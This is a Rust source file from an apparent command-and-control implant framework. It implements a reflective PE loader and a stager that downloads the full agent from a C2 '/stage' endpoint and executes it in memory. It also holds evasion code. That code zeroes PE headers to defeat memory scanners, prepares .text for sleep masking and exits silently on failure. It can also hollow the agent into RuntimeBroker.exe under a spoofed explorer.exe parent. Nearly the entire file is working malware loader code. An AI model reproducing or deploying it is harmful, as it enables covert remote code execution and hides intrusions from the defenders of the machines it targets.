//! UDRL — user-defined reflective loader.
//!
//! `reflect_pe()` maps a raw PE image into the current process without using the
//! Windows loader, resolves the IAT, applies base relocations, sets per-section
//! page permissions, and returns a callable function pointer to the PE entry point.
//!
//! `do_staged_load()` (feature = "staged-payload") fetches the full agent PE from the
//! C2 /stage endpoint and passes it to `reflect_pe()`, then jumps to the entry point.
//! The calling main() frame never returns; the full agent takes over.

#![allow(unused)]

// ── PE parsing ────────────────────────────────────────────────────────────────

struct PeInfo {
    image_base:      u64,
    size_of_image:   u32,
    size_of_headers: u32,
    entry_point_rva: u32,
    import_rva:      u32,
    import_size:     u32,
    reloc_rva:       u32,
    reloc_size:      u32,
    sections:        Vec<Section>,
}

struct Section {
    virtual_address: u32,
    virtual_size:    u32,
    raw_offset:      u32,
    raw_size:        u32,
    characteristics: u32,
}

#[repr(C)]
struct ImportDescriptor {
    original_first_thunk: u32,
    time_date_stamp:      u32,
    forwarder_chain:      u32,
    name:                 u32,
    first_thunk:          u32,
}

fn parse_pe(pe: &[u8]) -> Option<PeInfo> {
    if pe.len() < 64 {
        return None;
    }
    if u16::from_le_bytes([pe[0], pe[1]]) != 0x5A4D {
        return None;
    }
    let e_lfanew = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
    if pe.len() < e_lfanew + 4 {
        return None;
    }
    if u32::from_le_bytes([pe[e_lfanew], pe[e_lfanew+1], pe[e_lfanew+2], pe[e_lfanew+3]]) != 0x00004550 {
        return None;
    }
    let fh = e_lfanew + 4;
    if pe.len() < fh + 20 { return None; }
    let num_sections = u16::from_le_bytes([pe[fh+2], pe[fh+3]]) as usize;
    let size_of_opt  = u16::from_le_bytes([pe[fh+16], pe[fh+17]]) as usize;
    let oh = fh + 20;
    if pe.len() < oh + size_of_opt { return None; }
    // Only PE32+ (magic 0x020B) on x64
    if u16::from_le_bytes([pe[oh], pe[oh+1]]) != 0x020B { return None; }

    let entry_point_rva = u32::from_le_bytes([pe[oh+16], pe[oh+17], pe[oh+18], pe[oh+19]]);
    let image_base      = u64::from_le_bytes([
        pe[oh+24], pe[oh+25], pe[oh+26], pe[oh+27],
        pe[oh+28], pe[oh+29], pe[oh+30], pe[oh+31],
    ]);
    let size_of_image   = u32::from_le_bytes([pe[oh+56], pe[oh+57], pe[oh+58], pe[oh+59]]);
    let size_of_headers = u32::from_le_bytes([pe[oh+60], pe[oh+61], pe[oh+62], pe[oh+63]]);
    let num_rva         = u32::from_le_bytes([pe[oh+108], pe[oh+109], pe[oh+110], pe[oh+111]]) as usize;

    // data_directory[1] = import table, [5] = base relocation
    let dd_base = oh + 112;
    let (import_rva, import_size) = if num_rva > 1 && pe.len() >= dd_base + 16 {
        (
            u32::from_le_bytes([pe[dd_base+8],  pe[dd_base+9],  pe[dd_base+10], pe[dd_base+11]]),
            u32::from_le_bytes([pe[dd_base+12], pe[dd_base+13], pe[dd_base+14], pe[dd_base+15]]),
        )
    } else {
        (0, 0)
    };
    let (reloc_rva, reloc_size) = if num_rva > 5 && pe.len() >= dd_base + 48 {
        (
            u32::from_le_bytes([pe[dd_base+40], pe[dd_base+41], pe[dd_base+42], pe[dd_base+43]]),
            u32::from_le_bytes([pe[dd_base+44], pe[dd_base+45], pe[dd_base+46], pe[dd_base+47]]),
        )
    } else {
        (0, 0)
    };

    let sh = oh + size_of_opt;
    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let s = sh + i * 40;
        if pe.len() < s + 40 { break; }
        sections.push(Section {
            virtual_address: u32::from_le_bytes([pe[s+12], pe[s+13], pe[s+14], pe[s+15]]),
            virtual_size:    u32::from_le_bytes([pe[s+8],  pe[s+9],  pe[s+10], pe[s+11]]),
            raw_offset:      u32::from_le_bytes([pe[s+20], pe[s+21], pe[s+22], pe[s+23]]),
            raw_size:        u32::from_le_bytes([pe[s+16], pe[s+17], pe[s+18], pe[s+19]]),
            characteristics: u32::from_le_bytes([pe[s+36], pe[s+37], pe[s+38], pe[s+39]]),
        });
    }

    Some(PeInfo { image_base, size_of_image, size_of_headers, entry_point_rva,
                  import_rva, import_size, reloc_rva, reloc_size, sections })
}

// ── Base relocation ───────────────────────────────────────────────────────────

unsafe fn apply_relocations(new_base: *mut u8, pe: &[u8], reloc_rva: u32, reloc_size: u32, delta: i64) {
    let mut off = reloc_rva as usize;
    let end = off + reloc_size as usize;
    while off + 8 <= end && off + 8 <= pe.len() {
        let page_rva   = u32::from_le_bytes([pe[off], pe[off+1], pe[off+2], pe[off+3]]);
        let block_size = u32::from_le_bytes([pe[off+4], pe[off+5], pe[off+6], pe[off+7]]) as usize;
        if block_size < 8 { break; }
        let n_entries = (block_size - 8) / 2;
        for i in 0..n_entries {
            let eo = off + 8 + i * 2;
            if eo + 2 > pe.len() { break; }
            let entry = u16::from_le_bytes([pe[eo], pe[eo+1]]);
            if entry >> 12 == 10 { // IMAGE_REL_BASED_DIR64
                let target = new_base.add(page_rva as usize + (entry & 0x0FFF) as usize) as *mut i64;
                *target = (*target).wrapping_add(delta);
            }
        }
        off += block_size;
    }
}

// ── IAT resolution ────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn resolve_iat(new_base: *mut u8, info: &PeInfo) {
    use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};

    if info.import_rva == 0 { return; }
    let mut desc = new_base.add(info.import_rva as usize) as *const ImportDescriptor;
    loop {
        let d = &*desc;
        if d.name == 0 { break; }
        let dll_name = new_base.add(d.name as usize) as *const u8;
        let hmod = LoadLibraryA(dll_name);
        if hmod != 0 {
            let oft_rva = if d.original_first_thunk != 0 { d.original_first_thunk } else { d.first_thunk };
            let mut oft = new_base.add(oft_rva as usize) as *const u64;
            let mut ft  = new_base.add(d.first_thunk as usize) as *mut u64;
            loop {
                let thunk = *oft;
                if thunk == 0 { break; }
                let addr = if thunk >> 63 != 0 {
                    // Import by ordinal
                    let ord = (thunk & 0xFFFF) as u16;
                    GetProcAddress(hmod, ord as *const u8)
                } else {
                    // Import by name: IMAGE_IMPORT_BY_NAME.Name is at thunk+2
                    let name_ptr = new_base.add((thunk as u32 & 0x7FFF_FFFF) as usize + 2) as *const u8;
                    GetProcAddress(hmod, name_ptr)
                };
                if let Some(fn_ptr) = addr {
                    *ft = fn_ptr as u64;
                }
                oft = oft.add(1);
                ft  = ft.add(1);
            }
        }
        desc = desc.add(1);
    }
}

// ── Section permissions ───────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn set_section_permissions(new_base: *mut u8, sections: &[Section]) {
    use windows_sys::Win32::System::Memory::VirtualProtect;

    const SCN_MEM_EXECUTE: u32 = 0x20000000;
    const SCN_MEM_WRITE:   u32 = 0x80000000;
    const PAGE_READONLY:         u32 = 0x02;
    const PAGE_READWRITE:        u32 = 0x04;
    const PAGE_EXECUTE_READ:     u32 = 0x20;
    const PAGE_EXECUTE_READWRITE:u32 = 0x40;

    for sec in sections {
        if sec.virtual_size == 0 { continue; }
        let prot = match (
            sec.characteristics & SCN_MEM_EXECUTE != 0,
            sec.characteristics & SCN_MEM_WRITE   != 0,
        ) {
            (true,  true)  => PAGE_EXECUTE_READWRITE,
            (true,  false) => PAGE_EXECUTE_READ,
            (false, true)  => PAGE_READWRITE,
            (false, false) => PAGE_READONLY,
        };
        let mut old: u32 = 0;
        VirtualProtect(
            new_base.add(sec.virtual_address as usize) as *const core::ffi::c_void,
            sec.virtual_size as usize,
            prot,
            &mut old,
        );
    }
}

// ── .text bounds — set by reflect_pe, read by masked_sleep for Step 5 ────────

#[cfg(all(target_os = "windows", feature = "udrl"))]
pub static TEXT_BASE: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
#[cfg(all(target_os = "windows", feature = "udrl"))]
pub static TEXT_SIZE: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);

// ── UDRL entry point ──────────────────────────────────────────────────────────

/// Map a PE image into the current process without using the Windows loader.
///
/// Returns a function pointer to the PE entry point on success.
/// The caller is responsible for calling the entry point with appropriate arguments.
///
/// Safety: the returned function pointer is only valid for the lifetime of the
/// allocation. Do not call after freeing.
#[cfg(all(target_os = "windows", feature = "udrl"))]
pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
    use windows_sys::Win32::System::Memory::{
        VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    };

    let info = parse_pe(pe).ok_or("invalid PE")?;

    // Try to allocate at the preferred image base; fall back to anywhere.
    let mut new_base = VirtualAlloc(
        info.image_base as *const core::ffi::c_void,
        info.size_of_image as usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) as *mut u8;
    if new_base.is_null() {
        new_base = VirtualAlloc(
            core::ptr::null(),
            info.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as *mut u8;
        if new_base.is_null() {
            return Err("VirtualAlloc failed");
        }
    }

    // Copy PE headers
    let hdr_len = info.size_of_headers as usize;
    if hdr_len > pe.len() {
        return Err("PE header size exceeds file");
    }
    core::ptr::copy_nonoverlapping(pe.as_ptr(), new_base, hdr_len);

    // Copy sections
    for sec in &info.sections {
        if sec.raw_size == 0 || sec.raw_offset == 0 { continue; }
        let src_end = sec.raw_offset as usize + sec.raw_size as usize;
        if src_end > pe.len() { continue; }
        let dst = new_base.add(sec.virtual_address as usize);
        core::ptr::copy_nonoverlapping(
            pe.as_ptr().add(sec.raw_offset as usize),
            dst,
            sec.raw_size as usize,
        );
    }

    // Base relocations (required if allocated at a different VA)
    let delta = new_base as i64 - info.image_base as i64;
    if delta != 0 && info.reloc_rva != 0 {
        apply_relocations(new_base, pe, info.reloc_rva, info.reloc_size, delta);
    }

    // Import address table
    resolve_iat(new_base, &info);

    // Per-section memory permissions
    set_section_permissions(new_base, &info.sections);

    // Step 5: record .text section bounds so masked_sleep can XOR it during sleep.
    // Step 3: stomp PE headers AFTER section perms are set (headers stay RW at this point
    //         since no section covers the header range).
    {
        use core::sync::atomic::Ordering;
        use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_READWRITE, PAGE_READONLY};

        // Find and record the .text section.
        let sh_base = {
            let fh = (u32::from_le_bytes([pe[0x3C],pe[0x3D],pe[0x3E],pe[0x3F]]) as usize) + 4;
            let opt_sz = u16::from_le_bytes([pe[fh+16],pe[fh+17]]) as usize;
            fh + 20 + opt_sz
        };
        for i in 0..info.sections.len() {
            let s = sh_base + i * 40;
            if pe.len() >= s + 8 && pe[s..s+5] == *b".text" {
                TEXT_BASE.store(new_base as u64 + info.sections[i].virtual_address as u64, Ordering::Relaxed);
                TEXT_SIZE.store(info.sections[i].virtual_size as u64, Ordering::Relaxed);
                break;
            }
        }

        // Step 3: zero the MZ/PE header region so memory scanners can't fingerprint the image.
        let stomp_size = (info.size_of_headers as usize).min(0x1000);
        let mut old_prot: u32 = 0;
        if VirtualProtect(new_base as _, stomp_size, PAGE_READWRITE, &mut old_prot) != 0 {
            core::ptr::write_bytes(new_base, 0u8, stomp_size);
            VirtualProtect(new_base as _, stomp_size, PAGE_READONLY, &mut old_prot);
        }
    }

    Ok(new_base.add(info.entry_point_rva as usize))
}

// ── Staged payload ────────────────────────────────────────────────────────────

/// Fetch the full agent PE from the C2 /stage endpoint, reflectively load it,
/// and transfer execution. Never returns on success.
///
/// The stager binary is compiled with DM_FEATURES=staged-payload,udrl and
/// is intentionally tiny (~8 KB). It carries only the C2 host/port and build UUID
/// needed to locate and retrieve the full agent PE.
#[cfg(all(target_os = "windows", feature = "staged-payload", feature = "udrl"))]
pub fn do_staged_load() -> ! {
    let url = format!(
        "https://{}:{}/stage/{}",
        crate::C2_HOST,
        crate::C2_PORT,
        crate::BUILD_UUID,
    );

    // Fetch the full PE over TLS. Reuse the existing HTTPS channel logic.
    let pe_bytes = match fetch_stage(&url) {
        Some(b) => b,
        None    => {
            // Staged fetch failed — silent exit, no crash, no log.
            std::process::exit(0);
        }
    };

    // Step 6: when process-hollow and ppid-spoof features are both active,
    // hollow the full agent into RuntimeBroker.exe (spoofed under explorer.exe)
    // so all future child processes appear to come from a legitimate parent.
    // The stager then exits cleanly; the agent runs inside the hollowed process.
    #[cfg(all(feature = "process-hollow", feature = "ppid-spoof"))]
    {
        let explorer_pid = crate::inject::pid_by_name("explorer.exe");
        let target = "C:\\Windows\\System32\\RuntimeBroker.exe";
        let spoofed = explorer_pid.and_then(|ppid| {
            crate::inject::spawn_suspended_spoofed(target, ppid)
        });
        let hollow_ok = if let Some((proc, thread)) = spoofed {
            let ok = crate::inject::hollow_into_process(proc, thread, &pe_bytes).is_ok();
            if !ok {
                // If hollow failed the process is abandoned — it was suspended and
                // will be cleaned up by the OS when our stager exits.
            }
            ok
        } else {
            false
        };
        if hollow_ok {
            std::process::exit(0);
        }
        // Fallback: hollow without PPID spoof if the spoofed spawn failed.
        if crate::inject::inject_hollow(target, &pe_bytes).is_ok() {
            std::process::exit(0);
        }
    }

    // Non-hollow path: reflect the agent PE into the stager's own address space.
    let entry = unsafe {
        match reflect_pe(&pe_bytes) {
            Ok(ep) => ep,
            Err(_) => std::process::exit(0),
        }
    };

    // Jump to the reflectively-loaded agent entry point.
    // The PE was compiled without staged-payload, so it runs its normal main() loop.
    let main_fn: unsafe extern "system" fn() = unsafe { core::mem::transmute(entry) };
    unsafe { main_fn() };

    std::process::exit(0);
}

#[cfg(all(target_os = "windows", feature = "staged-payload", feature = "udrl"))]
fn fetch_stage(url: &str) -> Option<Vec<u8>> {
    let mut builder = ureq::AgentBuilder::new()
        .timeout(std::time::Duration::from_secs(60));

    // Respect the same TLS-skip-verify flag as the HTTPS channel.
    if crate::channel::https::TLS_SKIP_VERIFY {
        builder = builder.tls_config(std::sync::Arc::new(
            crate::channel::https::danger_tls_config(),
        ));
    }
    let agent = builder.build();
    let resp = agent.get(url).call().ok()?;
    let mut buf = Vec::new();
    use std::io::Read;
    resp.into_reader().read_to_end(&mut buf).ok()?;
    if buf.len() < 64 {
        // Too small to be a valid PE
        return None;
    }
    Some(buf)
}
